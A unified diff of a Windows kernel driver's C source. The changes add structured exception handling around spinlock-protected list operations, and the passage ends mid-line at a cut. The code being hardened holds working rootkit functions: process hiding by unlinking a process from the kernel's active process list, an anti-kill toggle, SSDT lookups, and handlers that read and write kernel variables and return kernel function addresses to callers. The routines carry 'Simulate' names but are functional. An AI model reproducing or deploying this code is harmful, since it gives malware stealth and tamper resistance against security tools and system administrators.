@@ -570,6 +570,8 @@ static NTSTATUS R0sRegisterVariable(ULONG Size, PVOID Address, const WCHAR* Name
 {
     PVAR_TABLE_ENTRY pEntry = NULL;
     KIRQL oldIrql;
+    NTSTATUS status = STATUS_SUCCESS;
+    BOOLEAN inserted = FALSE;
 
     if (Size == 0 || Size > sizeof(UINT64) || Address == NULL || Name == NULL)
         return STATUS_INVALID_PARAMETER;
@@ -584,9 +586,22 @@ static NTSTATUS R0sRegisterVariable(ULONG Size, PVOID Address, const WCHAR* Name
     R0sWcsCopyN(pEntry->Name, Name, 64);
 
     KeAcquireSpinLock(&g_VarTableLock, &oldIrql);
-    pEntry->Id = g_VarNextId++;
-    InsertTailList(&g_VarTableHead, &pEntry->ListEntry);
+    __try {
+        pEntry->Id = g_VarNextId++;
+        InsertTailList(&g_VarTableHead, &pEntry->ListEntry);
+        inserted = TRUE;
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER) {
+        status = GetExceptionCode();
+    }
     KeReleaseSpinLock(&g_VarTableLock, oldIrql);
+
+    if (!NT_SUCCESS(status)) {
+        if (!inserted) {
+            ExFreePoolWithTag(pEntry, 'VREG');
+        }
+        return status;
+    }
 
     if (pOutId) *pOutId = pEntry->Id;
     return STATUS_SUCCESS;
@@ -598,13 +613,16 @@ static PVAR_TABLE_ENTRY FindVarById(ULONG Id)
     KIRQL oldIrql;
 
     KeAcquireSpinLock(&g_VarTableLock, &oldIrql);
-    {
+    __try {
         PLIST_ENTRY p = g_VarTableHead.Flink;
         while (p != &g_VarTableHead) {
             PVAR_TABLE_ENTRY e = CONTAINING_RECORD(p, VAR_TABLE_ENTRY, ListEntry);
             if (e->Id == Id) { found = e; break; }
             p = p->Flink;
         }
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER) {
+        found = NULL;
     }
     KeReleaseSpinLock(&g_VarTableLock, oldIrql);
     return found;
@@ -649,20 +667,28 @@ static VOID FreeVarTable(VOID)
 {
     KIRQL oldIrql;
     PLIST_ENTRY p;
-    PLIST_ENTRY next;
+    PVAR_TABLE_ENTRY e;
 
-    KeAcquireSpinLock(&g_VarTableLock, &oldIrql);
-    p = g_VarTableHead.Flink;
-    while (p != &g_VarTableHead) {
-        PVAR_TABLE_ENTRY e = CONTAINING_RECORD(p, VAR_TABLE_ENTRY, ListEntry);
-        next = p->Flink;
-        RemoveEntryList(p);
-        KeReleaseSpinLock(&g_VarTableLock, oldIrql);
-        ExFreePoolWithTag(e, 'VREG');
+    for (;;) {
+        e = NULL;
         KeAcquireSpinLock(&g_VarTableLock, &oldIrql);
-        p = next;
+        __try {
+            p = g_VarTableHead.Flink;
+            if (p != &g_VarTableHead) {
+                e = CONTAINING_RECORD(p, VAR_TABLE_ENTRY, ListEntry);
+                RemoveEntryList(p);
+            }
+        }
+        __except (EXCEPTION_EXECUTE_HANDLER) {
+            e = NULL;
+        }
+        KeReleaseSpinLock(&g_VarTableLock, oldIrql);
+
+        if (e == NULL) break;
+
+        __try { ExFreePoolWithTag(e, 'VREG'); }
+        __except (EXCEPTION_EXECUTE_HANDLER) { }
     }
-    KeReleaseSpinLock(&g_VarTableLock, oldIrql);
 }
 
 static VOID RegisterAllVariables(VOID)
@@ -775,11 +801,16 @@ static BOOLEAN R0sIsCallerAuthorized(VOID)
     if (!curProc) return FALSE;
 
     KeAcquireSpinLock(&g_AuthListLock, &oldIrql);
-    p = g_AuthListHead.Flink;
-    while (p != &g_AuthListHead) {
-        PAUTH_ENTRY e = CONTAINING_RECORD(p, AUTH_ENTRY, ListEntry);
-        if (e->Process == curProc) { found = TRUE; break; }
-        p = p->Flink;
+    __try {
+        p = g_AuthListHead.Flink;
+        while (p != &g_AuthListHead) {
+            PAUTH_ENTRY e = CONTAINING_RECORD(p, AUTH_ENTRY, ListEntry);
+            if (e->Process == curProc) { found = TRUE; break; }
+            p = p->Flink;
+        }
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER) {
+        found = FALSE;
     }
     KeReleaseSpinLock(&g_AuthListLock, oldIrql);
     return found;
@@ -788,21 +819,34 @@ static BOOLEAN R0sIsCallerAuthorized(VOID)
 static VOID R0sFreeAuthList(VOID)
 {
     KIRQL oldIrql;
-    PLIST_ENTRY p, next;
+    PLIST_ENTRY p;
+    PAUTH_ENTRY e;
 
-    KeAcquireSpinLock(&g_AuthListLock, &oldIrql);
-    p = g_AuthListHead.Flink;
-    while (p != &g_AuthListHead) {
-        PAUTH_ENTRY e = CONTAINING_RECORD(p, AUTH_ENTRY, ListEntry);
-        next = p->Flink;
-        RemoveEntryList(p);
-        KeReleaseSpinLock(&g_AuthListLock, oldIrql);
-        if (e->Process) ObDereferenceObject(e->Process);
-        ExFreePoolWithTag(e, 'AUTH');
+    for (;;) {
+        e = NULL;
         KeAcquireSpinLock(&g_AuthListLock, &oldIrql);
-        p = next;
+        __try {
+            p = g_AuthListHead.Flink;
+            if (p != &g_AuthListHead) {
+                e = CONTAINING_RECORD(p, AUTH_ENTRY, ListEntry);
+                RemoveEntryList(p);
+            }
+        }
+        __except (EXCEPTION_EXECUTE_HANDLER) {
+            e = NULL;
+        }
+        KeReleaseSpinLock(&g_AuthListLock, oldIrql);
+
+        if (e == NULL) break;
+
+        __try {
+            if (e->Process) ObDereferenceObject(e->Process);
+        }
+        __except (EXCEPTION_EXECUTE_HANDLER) { }
+
+        __try { ExFreePoolWithTag(e, 'AUTH'); }
+        __except (EXCEPTION_EXECUTE_HANDLER) { }
     }
-    KeReleaseSpinLock(&g_AuthListLock, oldIrql);
 }
 
 static NTSTATUS R0sIrpCompletion(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context)
@@ -1206,13 +1250,16 @@ PSSDT_ENTRY FindSsdtBySsn(ULONG ssn)
     KIRQL oldIrql;
 
     KeAcquireSpinLock(&g_SsdtListLock, &oldIrql);
-    {
+    __try {
         PLIST_ENTRY p = g_SsdtListHead.Flink;
         while (p != &g_SsdtListHead) {
             PSSDT_ENTRY e = CONTAINING_RECORD(p, SSDT_ENTRY, ListEntry);
             if (e->Ssn == ssn) { found = e; break; }
             p = p->Flink;
         }
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER) {
+        found = NULL;
     }
     KeReleaseSpinLock(&g_SsdtListLock, oldIrql);
     return found;
@@ -1224,13 +1271,16 @@ PSSDT_ENTRY FindSsdtByName(const WCHAR* name)
     KIRQL oldIrql;
 
     KeAcquireSpinLock(&g_SsdtListLock, &oldIrql);
-    {
+    __try {
         PLIST_ENTRY p = g_SsdtListHead.Flink;
         while (p != &g_SsdtListHead) {
             PSSDT_ENTRY e = CONTAINING_RECORD(p, SSDT_ENTRY, ListEntry);
             if (R0sWcsEqI(e->Name, name)) { found = e; break; }
             p = p->Flink;
         }
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER) {
+        found = NULL;
     }
     KeReleaseSpinLock(&g_SsdtListLock, oldIrql);
     return found;
@@ -1748,125 +1798,173 @@ NTSTATUS R0SimulateKernelProcessHiding(PVOID InputBuffer, ULONG InputSize,
     if (op != R0SKPH_OP_ADD && op != R0SKPH_OP_REMOVE && op != R0SKPH_OP_LIST)
         return STATUS_INVALID_PARAMETER;
 
-    if (op == R0SKPH_OP_ADD) {
-        PEPROCESS pTarget = NULL;
-        PHIDDEN_PROCESS_ENTRY pEntry;
-        ULONG pid;
-        KIRQL oldIrql;
-        BOOLEAN alreadyHidden = FALSE;
-        PLIST_ENTRY pLink;
+    __try {
+        if (op == R0SKPH_OP_ADD) {
+            PEPROCESS pTarget = NULL;
+            PHIDDEN_PROCESS_ENTRY pEntry;
+            ULONG pid;
+            KIRQL oldIrql;
+            BOOLEAN alreadyHidden = FALSE;
+            PLIST_ENTRY pLink;
 
-        if (InputSize < sizeof(PROCESS_HIDING_INPUT) + sizeof(ULONG))
-            return STATUS_BUFFER_TOO_SMALL;
-        pid = *(ULONG*)((PUCHAR)InputBuffer + sizeof(PROCESS_HIDING_INPUT));
-        if (pid == 0) return STATUS_INVALID_PARAMETER;
+            if (InputSize < sizeof(PROCESS_HIDING_INPUT) + sizeof(ULONG))
+                return STATUS_BUFFER_TOO_SMALL;
+            pid = *(ULONG*)((PUCHAR)InputBuffer + sizeof(PROCESS_HIDING_INPUT));
+            if (pid == 0) return STATUS_INVALID_PARAMETER;
 
-        status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &pTarget);
-        if (!NT_SUCCESS(status)) return status;
+            status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &pTarget);
+            if (!NT_SUCCESS(status)) return status;
 
-        KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
-        {
-            PLIST_ENTRY pList = g_HiddenListHead.Flink;
-            while (pList != &g_HiddenListHead) {
-                PHIDDEN_PROCESS_ENTRY pCur = CONTAINING_RECORD(pList, HIDDEN_PROCESS_ENTRY, ListEntry);
-                if ((ULONG)(ULONG_PTR)pCur->ProcessId == pid) { alreadyHidden = TRUE; break; }
-                pList = pList->Flink;
-            }
-        }
-        KeReleaseSpinLock(&g_HiddenListLock, oldIrql);
-
-        if (alreadyHidden) { ObDereferenceObject(pTarget); return STATUS_ALREADY_COMMITTED; }
-
-        pEntry = (PHIDDEN_PROCESS_ENTRY)ExAllocatePoolWithTag(
-            NonPagedPool, sizeof(HIDDEN_PROCESS_ENTRY), 'HIDE');
-        if (!pEntry) { ObDereferenceObject(pTarget); return STATUS_INSUFFICIENT_RESOURCES; }
-        RtlZeroMemory(pEntry, sizeof(HIDDEN_PROCESS_ENTRY));
-        pEntry->ProcessId = (HANDLE)(ULONG_PTR)pid;
-        pEntry->EProcess = pTarget;
-
-        pLink = (PLIST_ENTRY)((PCHAR)pTarget + g_ActiveProcessLinksOffset);
-        __try { RemoveEntryList(pLink); } __except(EXCEPTION_EXECUTE_HANDLER) {}
-
-        KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
-        InsertHeadList(&g_HiddenListHead, &pEntry->ListEntry);
-        KeReleaseSpinLock(&g_HiddenListLock, oldIrql);
-
-        if (OutputSize >= sizeof(NTSTATUS)) { *(NTSTATUS*)OutputBuffer = STATUS_SUCCESS; *Info = sizeof(NTSTATUS); }
-        else *Info = 0;
-        return STATUS_SUCCESS;
-    }
-
-    if (op == R0SKPH_OP_REMOVE) {
-        ULONG pid;
-        KIRQL oldIrql;
-        PHIDDEN_PROCESS_ENTRY pEntry = NULL;
-        PEPROCESS pProc;
-        PLIST_ENTRY pLink, pSysLink;
-        PEPROCESS pSys;
-
-        if (InputSize < sizeof(PROCESS_HIDING_INPUT) + sizeof(ULONG))
-            return STATUS_BUFFER_TOO_SMALL;
-        pid = *(ULONG*)((PUCHAR)InputBuffer + sizeof(PROCESS_HIDING_INPUT));
-        if (pid == 0) return STATUS_INVALID_PARAMETER;
-
-        KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
-        {
-            PLIST_ENTRY pList = g_HiddenListHead.Flink;
-            while (pList != &g_HiddenListHead) {
-                PHIDDEN_PROCESS_ENTRY pCur = CONTAINING_RECORD(pList, HIDDEN_PROCESS_ENTRY, ListEntry);
-                if ((ULONG)(ULONG_PTR)pCur->ProcessId == pid) {
-                    pEntry = pCur;
-                    RemoveEntryList(&pEntry->ListEntry);
-                    break;
+            KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
+            __try {
+                PLIST_ENTRY pList = g_HiddenListHead.Flink;
+                while (pList != &g_HiddenListHead) {
+                    PHIDDEN_PROCESS_ENTRY pCur = CONTAINING_RECORD(pList, HIDDEN_PROCESS_ENTRY, ListEntry);
+                    if ((ULONG)(ULONG_PTR)pCur->ProcessId == pid) { alreadyHidden = TRUE; break; }
+                    pList = pList->Flink;
                 }
-                pList = pList->Flink;
             }
-        }
-        KeReleaseSpinLock(&g_HiddenListLock, oldIrql);
+            __except (EXCEPTION_EXECUTE_HANDLER) {
+                alreadyHidden = FALSE;
+            }
+            KeReleaseSpinLock(&g_HiddenListLock, oldIrql);
 
-        if (!pEntry) {
-            if (OutputSize >= sizeof(NTSTATUS)) { *(NTSTATUS*)OutputBuffer = STATUS_NOT_FOUND; *Info = sizeof(NTSTATUS); }
-            else *Info = 0;
-            return STATUS_NOT_FOUND;
+            if (alreadyHidden) { ObDereferenceObject(pTarget); return STATUS_ALREADY_COMMITTED; }
+
+            pEntry = (PHIDDEN_PROCESS_ENTRY)ExAllocatePoolWithTag(
+                NonPagedPool, sizeof(HIDDEN_PROCESS_ENTRY), 'HIDE');
+            if (!pEntry) { ObDereferenceObject(pTarget); return STATUS_INSUFFICIENT_RESOURCES; }
+            RtlZeroMemory(pEntry, sizeof(HIDDEN_PROCESS_ENTRY));
+            pEntry->ProcessId = (HANDLE)(ULONG_PTR)pid;
+            pEntry->EProcess = pTarget;
+
+            pLink = (PLIST_ENTRY)((PCHAR)pTarget + g_ActiveProcessLinksOffset);
+            __try { RemoveEntryList(pLink); }
+            __except(EXCEPTION_EXECUTE_HANDLER) {
+                ObDereferenceObject(pTarget);
+                ExFreePoolWithTag(pEntry, 'HIDE');
+                return GetExceptionCode();
+            }
+
+            KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
+            __try {
+                InsertHeadList(&g_HiddenListHead, &pEntry->ListEntry);
+            }
+            __except (EXCEPTION_EXECUTE_HANDLER) {
+                KeReleaseSpinLock(&g_HiddenListLock, oldIrql);
+                __try { InsertHeadList((PLIST_ENTRY)((PCHAR)PsInitialSystemProcess + g_ActiveProcessLinksOffset), pLink); }
+                __except (EXCEPTION_EXECUTE_HANDLER) { }
+                ObDereferenceObject(pTarget);
+                ExFreePoolWithTag(pEntry, 'HIDE');
+                return GetExceptionCode();
+            }
+            KeReleaseSpinLock(&g_HiddenListLock, oldIrql);
+
+            if (OutputSize >= sizeof(NTSTATUS)) {
+                __try { *(NTSTATUS*)OutputBuffer = STATUS_SUCCESS; }
+                __except (EXCEPTION_EXECUTE_HANDLER) { return GetExceptionCode(); }
+                *Info = sizeof(NTSTATUS);
+            } else *Info = 0;
+            return STATUS_SUCCESS;
         }
 
-        pProc = pEntry->EProcess;
-        if (pProc) {
-            pLink = (PLIST_ENTRY)((PCHAR)pProc + g_ActiveProcessLinksOffset);
-            pSys = PsInitialSystemProcess;
-            pSysLink = (PLIST_ENTRY)((PCHAR)pSys + g_ActiveProcessLinksOffset);
-            __try { InsertHeadList(pSysLink, pLink); } __except(EXCEPTION_EXECUTE_HANDLER) {}
-            ObDereferenceObject(pProc);
-        }
-        ExFreePoolWithTag(pEntry, 'HIDE');
+        if (op == R0SKPH_OP_REMOVE) {
+            ULONG pid;
+            KIRQL oldIrql;
+            PHIDDEN_PROCESS_ENTRY pEntry = NULL;
+            PEPROCESS pProc;
+            PLIST_ENTRY pLink, pSysLink;
+            PEPROCESS pSys;
 
-        if (OutputSize >= sizeof(NTSTATUS)) { *(NTSTATUS*)OutputBuffer = STATUS_SUCCESS; *Info = sizeof(NTSTATUS); }
-        else *Info = 0;
-        return STATUS_SUCCESS;
+            if (InputSize < sizeof(PROCESS_HIDING_INPUT) + sizeof(ULONG))
+                return STATUS_BUFFER_TOO_SMALL;
+            pid = *(ULONG*)((PUCHAR)InputBuffer + sizeof(PROCESS_HIDING_INPUT));
+            if (pid == 0) return STATUS_INVALID_PARAMETER;
+
+            KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
+            __try {
+                PLIST_ENTRY pList = g_HiddenListHead.Flink;
+                while (pList != &g_HiddenListHead) {
+                    PHIDDEN_PROCESS_ENTRY pCur = CONTAINING_RECORD(pList, HIDDEN_PROCESS_ENTRY, ListEntry);
+                    if ((ULONG)(ULONG_PTR)pCur->ProcessId == pid) {
+                        pEntry = pCur;
+                        RemoveEntryList(&pEntry->ListEntry);
+                        break;
+                    }
+                    pList = pList->Flink;
+                }
+            }
+            __except (EXCEPTION_EXECUTE_HANDLER) {
+                pEntry = NULL;
+            }
+            KeReleaseSpinLock(&g_HiddenListLock, oldIrql);
+
+            if (!pEntry) {
+                if (OutputSize >= sizeof(NTSTATUS)) {
+                    __try { *(NTSTATUS*)OutputBuffer = STATUS_NOT_FOUND; }
+                    __except (EXCEPTION_EXECUTE_HANDLER) { return GetExceptionCode(); }
+                    *Info = sizeof(NTSTATUS);
+                } else *Info = 0;
+                return STATUS_NOT_FOUND;
+            }
+
+            pProc = pEntry->EProcess;
+            if (pProc) {
+                pLink = (PLIST_ENTRY)((PCHAR)pProc + g_ActiveProcessLinksOffset);
+                pSys = PsInitialSystemProcess;
+                pSysLink = (PLIST_ENTRY)((PCHAR)pSys + g_ActiveProcessLinksOffset);
+                __try { InsertHeadList(pSysLink, pLink); }
+                __except(EXCEPTION_EXECUTE_HANDLER) { }
+                ObDereferenceObject(pProc);
+            }
+            ExFreePoolWithTag(pEntry, 'HIDE');
+
+            if (OutputSize >= sizeof(NTSTATUS)) {
+                __try { *(NTSTATUS*)OutputBuffer = STATUS_SUCCESS; }
+                __except (EXCEPTION_EXECUTE_HANDLER) { return GetExceptionCode(); }
+                *Info = sizeof(NTSTATUS);
+            } else *Info = 0;
+            return STATUS_SUCCESS;
+        }
+
+        {
+            ULONG maxCount = 0;
+            KIRQL oldIrql;
+            ULONG count = 0;
+            PLIST_ENTRY pList;
+
+            if (OutputSize >= sizeof(ULONG))
+                maxCount = (OutputSize - sizeof(ULONG)) / sizeof(HANDLE);
+
+            KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
+            __try {
+                pList = g_HiddenListHead.Flink;
+                while (pList != &g_HiddenListHead && count < maxCount) {
+                    PHIDDEN_PROCESS_ENTRY pCur = CONTAINING_RECORD(pList, HIDDEN_PROCESS_ENTRY, ListEntry);
+                    __try {
+                        ((HANDLE*)((PUCHAR)OutputBuffer + sizeof(ULONG)))[count] = pCur->ProcessId;
+                    }
+                    __except (EXCEPTION_EXECUTE_HANDLER) {
+                        break;
+                    }
+                    count++;
+                    pList = pList->Flink;
+                }
+            }
+            __finally {
+                KeReleaseSpinLock(&g_HiddenListLock, oldIrql);
+            }
+
+            if (OutputSize >= sizeof(ULONG)) {
+                __try { *(ULONG*)OutputBuffer = count; }
+                __except (EXCEPTION_EXECUTE_HANDLER) { return GetExceptionCode(); }
+                *Info = sizeof(ULONG) + count * sizeof(HANDLE);
+            } else { *Info = 0; return STATUS_BUFFER_TOO_SMALL; }
+            return STATUS_SUCCESS;
+        }
     }
-
-    {
-        ULONG maxCount = 0;
-        KIRQL oldIrql;
-        ULONG count = 0;
-        PLIST_ENTRY pList;
-
-        if (OutputSize >= sizeof(ULONG))
-            maxCount = (OutputSize - sizeof(ULONG)) / sizeof(HANDLE);
-
-        KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
-        pList = g_HiddenListHead.Flink;
-        while (pList != &g_HiddenListHead && count < maxCount) {
-            PHIDDEN_PROCESS_ENTRY pCur = CONTAINING_RECORD(pList, HIDDEN_PROCESS_ENTRY, ListEntry);
-            ((HANDLE*)((PUCHAR)OutputBuffer + sizeof(ULONG)))[count] = pCur->ProcessId;
-            count++;
-            pList = pList->Flink;
-        }
-        KeReleaseSpinLock(&g_HiddenListLock, oldIrql);
-
-        if (OutputSize >= sizeof(ULONG)) { *(ULONG*)OutputBuffer = count; *Info = sizeof(ULONG) + count * sizeof(HANDLE); }
-        else { *Info = 0; return STATUS_BUFFER_TOO_SMALL; }
-        return STATUS_SUCCESS;
+    __except (EXCEPTION_EXECUTE_HANDLER) {
+        return GetExceptionCode();
     }
 }
 
@@ -2014,12 +2112,18 @@ NTSTATUS R0SimulateSetInternalVariables(PVOID InputBuffer, ULONG InputSize,
         ULONG idx;
 
         KeAcquireSpinLock(&g_VarTableLock, &oldIrql);
-        for (p = g_VarTableHead.Flink; p != &g_VarTableHead; p = p->Flink) {
-            PVAR_TABLE_ENTRY e = CONTAINING_RECORD(p, VAR_TABLE_ENTRY, ListEntry);
-            ULONG bit = e->Id - 1;
-            if (R0S_ATTR_TEST(g_HideAttrDescriptor_Low, g_HideAttrDescriptor_High, bit))
-                continue;
-            count++;
+        __try {
+            for (p = g_VarTableHead.Flink; p != &g_VarTableHead; p = p->Flink) {
+                PVAR_TABLE_ENTRY e = CONTAINING_RECORD(p, VAR_TABLE_ENTRY, ListEntry);
+                ULONG bit = e->Id - 1;
+                if (R0S_ATTR_TEST(g_HideAttrDescriptor_Low, g_HideAttrDescriptor_High, bit))
+                    continue;
+                count++;
+            }
+        }
+        __except (EXCEPTION_EXECUTE_HANDLER) {
+            KeReleaseSpinLock(&g_VarTableLock, oldIrql);
+            return GetExceptionCode();
         }
         KeReleaseSpinLock(&g_VarTableLock, oldIrql);
 
@@ -2029,37 +2133,52 @@ NTSTATUS R0SimulateSetInternalVariables(PVOID InputBuffer, ULONG InputSize,
             return STATUS_BUFFER_TOO_SMALL;
         }
 
-        *(ULONG*)OutputBuffer = count;
-        pOutVar = (PVAR_INFO)((PUCHAR)OutputBuffer + sizeof(ULONG));
-        KeAcquireSpinLock(&g_VarTableLock, &oldIrql);
-        idx = 0;
-        p = g_VarTableHead.Flink;
-        while (p != &g_VarTableHead && idx < count) {
-            PVAR_TABLE_ENTRY e = CONTAINING_RECORD(p, VAR_TABLE_ENTRY, ListEntry);
-            UINT64 val = 0;
-            ULONG  bit = e->Id - 1;
-            if (R0S_ATTR_TEST(g_HideAttrDescriptor_Low, g_HideAttrDescriptor_High, bit)) {
-                p = p->Flink;
-                continue;
-            }
-
-            pOutVar[idx].Id   = e->Id;
-            pOutVar[idx].Size = e->Size;
-
-            if (R0S_ATTR_TEST(g_ReadAttrDescriptor_Low, g_ReadAttrDescriptor_High, bit)) {
-                val = 0xC0000022ULL;
-            } else {
-                if (e->Size == sizeof(ULONG))       val = *(ULONG*)e->Address;
-                else if (e->Size == sizeof(UINT64)) val = *(UINT64*)e->Address;
-                else RtlCopyMemory(&val, e->Address, e->Size);
-            }
-
-            pOutVar[idx].Value = val;
-            R0sWcsCopyN(pOutVar[idx].Name, e->Name, 32);
-            idx++;
-            p = p->Flink;
+        __try {
+            *(ULONG*)OutputBuffer = count;
         }
-        KeReleaseSpinLock(&g_VarTableLock, oldIrql);
+        __except (EXCEPTION_EXECUTE_HANDLER) {
+            return GetExceptionCode();
+        }
+        pOutVar = (PVAR_INFO)((PUCHAR)OutputBuffer + sizeof(ULONG));
+
+        KeAcquireSpinLock(&g_VarTableLock, &oldIrql);
+        __try {
+            idx = 0;
+            p = g_VarTableHead.Flink;
+            while (p != &g_VarTableHead && idx < count) {
+                PVAR_TABLE_ENTRY e = CONTAINING_RECORD(p, VAR_TABLE_ENTRY, ListEntry);
+                UINT64 val = 0;
+                ULONG  bit = e->Id - 1;
+                if (R0S_ATTR_TEST(g_HideAttrDescriptor_Low, g_HideAttrDescriptor_High, bit)) {
+                    p = p->Flink;
+                    continue;
+                }
+
+                pOutVar[idx].Id   = e->Id;
+                pOutVar[idx].Size = e->Size;
+
+                if (R0S_ATTR_TEST(g_ReadAttrDescriptor_Low, g_ReadAttrDescriptor_High, bit)) {
+                    val = 0xC0000022ULL;
+                } else {
+                    __try {
+                        if (e->Size == sizeof(ULONG))       val = *(ULONG*)e->Address;
+                        else if (e->Size == sizeof(UINT64)) val = *(UINT64*)e->Address;
+                        else RtlCopyMemory(&val, e->Address, e->Size);
+                    }
+                    __except (EXCEPTION_EXECUTE_HANDLER) {
+                        val = 0;
+                    }
+                }
+
+                pOutVar[idx].Value = val;
+                R0sWcsCopyN(pOutVar[idx].Name, e->Name, 32);
+                idx++;
+                p = p->Flink;
+            }
+        }
+        __finally {
+            KeReleaseSpinLock(&g_VarTableLock, oldIrql);
+        }
         *Info = required;
         return STATUS_SUCCESS;
     }
@@ -2095,17 +2214,27 @@ NTSTATUS R0SimulateSetInternalVariables(PVOID InputBuffer, ULONG InputSize,
         if (op == R0SIMULATE_VAR_OP_GET) {
             UINT64 val = 0;
             if (OutputSize < sizeof(UINT64)) return STATUS_BUFFER_TOO_SMALL;
-            if (target->Size == sizeof(ULONG))       val = *(ULONG*)target->Address;
-            else if (target->Size == sizeof(UINT64)) val = *(UINT64*)target->Address;
-            else RtlCopyMemory(&val, target->Address, target->Size);
-            *(UINT64*)OutputBuffer = val;
+            __try {
+                if (target->Size == sizeof(ULONG))       val = *(ULONG*)target->Address;
+                else if (target->Size == sizeof(UINT64)) val = *(UINT64*)target->Address;
+                else RtlCopyMemory(&val, target->Address, target->Size);
+                *(UINT64*)OutputBuffer = val;
+            }
+            __except (EXCEPTION_EXECUTE_HANDLER) {
+                return GetExceptionCode();
+            }
             *Info = sizeof(UINT64);
             return STATUS_SUCCESS;
         }
 
-        if (target->Size == sizeof(ULONG))       *(ULONG*)target->Address = (ULONG)pIn->Value;
-        else if (target->Size == sizeof(UINT64)) *(UINT64*)target->Address = pIn->Value;
-        else RtlCopyMemory(target->Address, &pIn->Value, target->Size);
+        __try {
+            if (target->Size == sizeof(ULONG))       *(ULONG*)target->Address = (ULONG)pIn->Value;
+            else if (target->Size == sizeof(UINT64)) *(UINT64*)target->Address = pIn->Value;
+            else RtlCopyMemory(target->Address, &pIn->Value, target->Size);
+        }
+        __except (EXCEPTION_EXECUTE_HANDLER) {
+            return GetExceptionCode();
+        }
 
         if (target->Address == (PVOID)(ULONG_PTR)&g_AntiKill) UpdateAntiKill();
 
@@ -2148,20 +2277,38 @@ NTSTATUS R0SimulateGetKernelFunction(PVOID InputBuffer, ULONG InputSize,
                 if (InputSize < sizeof(GET_KERNEL_FUNCTION_INPUT) + nameLen - 1) return STATUS_BUFFER_TOO_SMALL;
                 if (OutputSize < sizeof(UINT64)) return STATUS_BUFFER_TOO_SMALL;
 
-                RtlInitUnicodeString(&uniName, pIn->Name);
+                __try {
+                    RtlInitUnicodeString(&uniName, pIn->Name);
+                }
+                __except (EXCEPTION_EXECUTE_HANDLER) {
+                    return GetExceptionCode();
+                }
+
                 KeAcquireSpinLock(&g_FunctionTableLock, &oldIrql);
-                pList = g_FunctionTableHead.Flink;
-                while (pList != &g_FunctionTableHead) {
-                    PFUNCTION_ENTRY pNode = CONTAINING_RECORD(pList, FUNCTION_ENTRY, ListEntry);
-                    if (RtlCompareUnicodeString(&pNode->Name, &uniName, TRUE) == 0) {
-                        address = (UINT64)(ULONG_PTR)pNode->Address;
-                        break;
+                __try {
+                    pList = g_FunctionTableHead.Flink;
+                    while (pList != &g_FunctionTableHead) {
+                        PFUNCTION_ENTRY pNode = CONTAINING_RECORD(pList, FUNCTION_ENTRY, ListEntry);
+                        if (RtlCompareUnicodeString(&pNode->Name, &uniName, TRUE) == 0) {
+                            address = (UINT64)(ULONG_PTR)pNode->Address;
+                            break;
+                        }
+                        pList = pList->Flink;
                     }
-                    pList = pList->Flink;
+                }
+                __except (EXCEPTION_EXECUTE_HANDLER) {
+                    KeReleaseSpinLock(&g_FunctionTableLock, oldIrql);
+                    return GetExceptionCode();
                 }
                 KeReleaseSpinLock(&g_FunctionTableLock, oldIrql);
+
                 if (address == 0) return STATUS_NOT_FOUND;
-                *(UINT64*)OutputBuffer = address;
+                __try {
+                    *(UINT64*)OutputBuffer = address;
+                }
+                __except (EXCEPTION_EXECUTE_HANDLER) {
+                    return GetExceptionCode();
+                }
                 *Info = sizeof(UINT64);
                 return STATUS_SUCCESS;
             } else {
@@ -2172,30 +2319,50 @@ NTSTATUS R0SimulateGetKernelFunction(PVOID InputBuffer, ULONG InputSize,
                 ULONG idx;
 
                 KeAcquireSpinLock(&g_FunctionTableLock, &oldIrql);
-                pList = g_FunctionTableHead.Flink;
-                while (pList != &g_FunctionTableHead) { count++; pList = pList->Flink; }
+                __try {
+                    pList = g_FunctionTableHead.Flink;
+                    while (pList != &g_FunctionTableHead) { count++; pList = pList->Flink; }
+                }
+                __except (EXCEPTION_EXECUTE_HANDLER) {
+                    KeReleaseSpinLock(&g_FunctionTableLock, oldIrql);
+                    return GetExceptionCode();
+                }
                 KeReleaseSpinLock(&g_FunctionTableLock, oldIrql);
 
                 requiredSize = sizeof(ULONG) + count * sizeof(KERNEL_FUNCTION_ENTRY);
                 if (OutputSize < requiredSize) { *Info = requiredSize; return STATUS_BUFFER_TOO_SMALL; }
 
-                *(ULONG*)OutputBuffer = count;
+                __try {
+                    *(ULONG*)OutputBuffer = count;
+                }
+                __except (EXCEPTION_EXECUTE_HANDLER) {
+                    return GetExceptionCode();
+                }
                 pEntry = (PKERNEL_FUNCTION_ENTRY)((PUCHAR)OutputBuffer + sizeof(ULONG));
 
                 KeAcquireSpinLock(&g_FunctionTableLock, &oldIrql);
-                pList = g_FunctionTableHead.Flink;
-                idx = 0;
-                while (pList != &g_FunctionTableHead && idx < count) {
-                    PFUNCTION_ENTRY pNode = CONTAINING_RECORD(pList, FUNCTION_ENTRY, ListEntry);
-                    ULONG nameLenChars = (pNode->Name.Length / sizeof(WCHAR));
-                    pEntry[idx].Address = (UINT64)(ULONG_PTR)pNode->Address;
-                    if (nameLenChars >= 64) nameLenChars = 63;
-                    RtlCopyMemory(pEntry[idx].Name, pNode->Name.Buffer, nameLenChars * sizeof(WCHAR));
-                    pEntry[idx].Name[nameLenChars] = L'\0';
-                    idx++;
-                    pList = pList->Flink;
+                __try {
+                    pList = g_FunctionTableHead.Flink;
+                    idx = 0;
+                    while (pList != &g_FunctionTableHead && idx < count) {
+                        PFUNCTION_ENTRY pNode = CONTAINING_RECORD(pList, FUNCTION_ENTRY, ListEntry);
+                        ULONG nameLenChars = (pNode->Name.Length / sizeof(WCHAR));
+                        pEntry[idx].Address = (UINT64)(ULONG_PTR)pNode->Address;
+                        if (nameLenChars >= 64) nameLenChars = 63;
+                        __try {
+                            RtlCopyMemory(pEntry[idx].Name, pNode->Name.Buffer, nameLenChars * sizeof(WCHAR));
